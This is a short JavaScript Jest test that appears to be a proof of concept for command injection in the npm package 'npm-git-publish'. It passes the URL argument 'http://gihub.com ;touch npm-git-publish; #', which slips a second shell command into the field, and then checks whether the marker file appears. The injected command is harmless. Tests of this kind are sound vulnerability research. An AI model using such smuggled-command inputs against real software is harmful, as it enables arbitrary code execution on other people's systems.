// RCE or CI?
test("Command Injection in npm-git-publish", () => {
  expect.assertions(2);
  const git = require("npm-git-publish");
  const fs = require("fs");
  const path = "./npm-git-publish";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  git.publish(".", "http://gihub.com ;touch npm-git-publish; #").then(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
